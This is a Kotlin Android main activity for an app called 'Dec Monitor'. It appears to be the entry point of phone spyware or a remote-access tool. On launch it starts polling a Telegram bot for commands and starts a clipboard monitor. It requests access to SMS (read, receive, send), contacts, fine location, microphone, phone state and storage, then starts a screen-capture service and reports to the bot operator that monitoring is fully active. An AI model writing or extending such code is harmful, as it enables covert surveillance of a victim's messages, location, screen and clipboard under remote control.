package com.dec.monitor

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.dec.monitor.input.ClipboardMonitor
import com.dec.monitor.screen.ScreenshotService

class MainActivity : AppCompatActivity() {

    private val PROJECTION_REQUEST = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // start command polling
        TelegramBot.startPolling(applicationContext)

        // start clipboard monitor
        ClipboardMonitor.start(applicationContext)

        requestPermissions(arrayOf(
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
        ), 100)

        findViewById<Button>(R.id.btnStart).setOnClickListener {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
        }

        findViewById<TextView>(R.id.tvStatus).text = "Dec Monitor active.\nTap Start to enable screen capture."

        TelegramBot.appContext = applicationContext
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PROJECTION_REQUEST && resultCode == Activity.RESULT_OK && data != null) {
            val serviceIntent = Intent(this, ScreenshotService::class.java).apply {
                putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode)
                putExtra(ScreenshotService.EXTRA_RESULT_DATA, data)
            }
            startForegroundService(serviceIntent)
            findViewById<TextView>(R.id.tvStatus).text = "✅ All monitoring active."
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                TelegramBot.sendMessage("✅ <b>Dec Monitor fully active.</b>\nSend /help for commands.")
            }
        }
    }
}
